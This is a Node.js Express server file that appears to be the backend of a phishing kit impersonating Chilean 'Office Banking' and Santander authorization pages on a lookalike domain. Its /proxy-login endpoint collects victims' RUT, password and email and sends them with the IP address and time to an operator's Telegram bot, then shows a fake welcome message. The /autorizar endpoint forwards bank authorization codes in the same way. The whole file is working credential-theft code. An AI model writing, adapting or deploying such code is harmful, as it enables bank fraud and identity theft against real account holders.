const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// ✅ CORS mejorado - permite AMBOS dominios sin redirección
const corsOptions = {
  origin: function(origin, callback) {
    if (!origin || 
        origin === "https://www.officebankingchile.info" || 
        origin === "https://officebankingchile.info" ||
        origin === "http://localhost:3000" ||
        origin === "http://localhost:5000") {
      callback(null, true);
    } else {
      callback(new Error("No permitido por CORS"));
    }
  },
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ✅ Middleware para logging detallado
app.use((req, res, next) => {
  console.log(`\n📨 ${req.method} ${req.path}`);
  console.log(`Origin: ${req.get('origin')}`);
  if(req.method === "POST") {
    console.log(`Body:`, JSON.stringify(req.body, null, 2));
  }
  next();
});

// ✅ Verificar variables de entorno al iniciar
console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
if(process.env.TELEGRAM_TOKEN) console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
if(process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
console.log("================================\n");

// ✅ Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Servidor funcionando correctamente" });
});

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    res.json(cfg);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Endpoint para procesar saldo directamente
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  try {
    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }

    if (cfg.tipoAutorizacion === "coordenadas") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
      return;
    }

    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
      });
    }
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error("Error en autorizar:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// ✅ Función auxiliar para enviar a Telegram
async function enviarATelegram(mensaje) {
  try {
    console.log(`\n📤 ENVIANDO A TELEGRAM...`);
    console.log(`Token disponible: ${process.env.TELEGRAM_TOKEN ? "✅" : "❌"}`);
    console.log(`Chat ID disponible: ${process.env.CHAT_ID ? "✅" : "❌"}`);
    
    if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
      console.error(`❌ ERROR: Faltan variables de entorno`);
      return false;
    }

    console.log(`Intentando enviar mensaje...`);
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
    console.log(`URL: ${url.substring(0, 50)}...`);
    
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: process.env.CHAT_ID, 
        text: mensaje 
      })
    });

    const data = await response.json();
    console.log(`Status HTTP: ${response.status}`);
    console.log(`Respuesta: ${JSON.stringify(data)}`);

    if (data.ok) {
      console.log(`✅ MENSAJE ENVIADO A TELEGRAM CORRECTAMENTE`);
      return true;
    } else {
      console.error(`❌ ERROR TELEGRAM: ${data.description}`);
      return false;
    }
  } catch (err) {
    console.error(`❌ EXCEPCIÓN AL ENVIAR A TELEGRAM:`, err.message);
    return false;
  }
}

// ✅ Endpoint para login - CON LOGGING DETALLADO
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  console.log("\n" + "=".repeat(60));
  console.log(`🔐 === NUEVO REQUEST A /proxy-login ===`);
  console.log(`IP: ${ip}`);
  console.log(`Parámetros recibidos: RUT=${rut ? "✅" : "❌"}, PASSWD=${passwd ? "✅" : "❌"}, MAIL=${mail ? "✅" : "❌"}`);
  console.log("=".repeat(60));

  try {
    // Si es correo
    if (mail) {
      console.log(`\n📧 PROCESANDO CORREO: ${mail}`);
      
      const mensajeCorrecto = `📧 Correo actualizado:\n${mail}\nIP: ${ip}`;
      const resultado = await enviarATelegram(mensajeCorrecto);
      
      return res.json({ 
        status: "ok", 
        mensaje: resultado ? "Correo actualizado correctamente" : "✅ Correo recibido (sin Telegram)" 
      });
    }

    // Si es login
    if (rut && passwd) {
      console.log(`\n🔐 LOGIN CON RUT: ${rut.substring(0, 5)}***`);
      
       const mensajeLogin = `🔐 Nuevo Login en Office Banking:
RUT: ${rut}
Clave: ${passwd}
IP: ${ip}
Hora: ${new Date().toLocaleString('es-CL')}`;
      const resultado = await enviarATelegram(mensajeLogin);
      
      console.log(`\n✅ Respondiendo al cliente...`);
      return res.json({ 
        status: "ok", 
        mensaje: "Bienvenido a Office Banking" 
      });
    }

    console.log(`\n⚠️ SIN PARÁMETROS VÁLIDOS`);
    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
  } catch (err) {
    console.error(`\n❌ EXCEPCIÓN EN /proxy-login:`, err);
    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
  }
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ✅ Manejo de errores 404
app.use((req, res) => {
  res.status(404).json({ error: "Ruta no encontrada" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
